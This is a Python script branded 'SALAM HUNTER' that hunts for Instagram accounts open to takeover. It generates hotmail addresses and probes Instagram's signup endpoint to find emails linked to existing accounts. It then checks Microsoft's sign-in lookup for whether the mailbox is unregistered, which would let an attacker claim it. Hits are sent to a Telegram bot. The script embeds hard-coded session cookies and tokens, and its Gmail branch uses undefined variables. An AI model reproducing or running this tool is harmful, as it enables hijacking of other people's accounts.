import requests
import uuid
import colorama 
import time 
import secrets
import random

E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
def g():
	global eml,bn,iddc
	data2 = {
						'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue',
						'service': 'accountsettings',
						'f.req': f'["{eml}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{eml}",null,null,null,true,true,[]]',
						'bgRequest': '["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]',
						'at': 'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804',
						'azt': 'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805',
						'cookiesDisabled': 'false',
						'deviceinfo': '[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]',
						'gmscoreversion': 'undefined',
						'checkConnection': 'youtube:353:0',
						'checkedDomains': 'youtube',
						'pstMsg': '1'}
	req2 = requests.post(url2,data=data2,headers=headers_gmail).text	
	if ',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]' in req2:
		R ='='*20		
		tlg =(f'https://api.telegram.org/bot{bn}/sendMessage?chat_id={iddc}&text=📧 instagram <{eml}>\n━━━━━━━━━━━━━\n• Tele : @SALAMMZORI . @T5B55 ؟ ، 🔥')
		req = requests.post(tlg)	
		print(G+eml)
	else:
		print(E+eml)
		pass

def hotmail():
	global eml,bn,iddc
	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + eml + "&_=1604288577990"
	data = ''
	headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
	
	html = requests.get(url, data=data, headers=headers)
	if 'Neither' in html.text:	
		R ='='*20			
		tlg =(f'https://api.telegram.org/bot{bn}/sendMessage?chat_id={iddc}&text=📧 instagram <{eml}>\n━━━━━━━━━━━━━\n• Tele : @SALAMMZORI . @T5B55 ؟ ، 🔥')
		req = requests.post(tlg)	
		print(G+eml)
	else:
		print(E+eml)
		pass
		
tuks1 = 'poiuytrewqasdfghjklmnbvcxz12'
jruks = '\033[1;33m'
_ruks  = '\033[1;31m'
BGreen='\033[1;32m'

E = '\033[1;31m'
A = '\033[1;33m'
Q = '\033[1;34m'
G = '\033[1;32m'
W = '\033[1;36m'


ruks = ''


R =('━'*60)
print(f"""{BGreen}{R}

 𝗦𝗔𝗟𝗔𝗠 𝗛𝗨𝗡𝗧𝗘𝗥〞𓆪†.✅
                                              
{R}
""")
bn=input(f"{E}[{A}+{E}]{W} TOKEN  ; ")
iddc=input(f"{E}[{A}+{E}]{W} ID  ; ")
print('='*20)
def Code_ruks():
    global eml
    if ruks =='':
        Number = 0
        file = open("name.txt","r").readlines()
        i=0	
        while True:
            file1 = random.choice(file)
            i+=1
            if i == 101:
            	i=0		
            eml=(file1[0:-1] + "_%d" % (i+1) + "@hotmail.com")
               
            #eml = file.readline().split('\n')[0]   
            url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
            heade_ruks={
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
                'content-length': '61',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/emailsignup/',
                'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
                'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
                'x-instagram-ajax': '72bda6b1d047',
                'x-requested-with': 'XMLHttpRequest'

            } 

            data_ruks={
                'email' : f'{eml}',
                'username': f'{eml}',
                'first_name': 'AA',
                'opt_into_one_tap': 'false'
            }
            try:
            	da = requests.post(url,headers=heade_ruks,data=data_ruks)
            	eml1 = (da.json()["errors"]["email"])	       	
            	if '@gmail.com' in str(eml):
            		g()
            	elif '@hotmail.com' in str(eml):
            		hotmail()
            	elif '@outlook.com' in str(eml):
            		hotmail()
            except:
            	print(jruks+eml)
            	pass
            	
            	
Code_ruks()      
      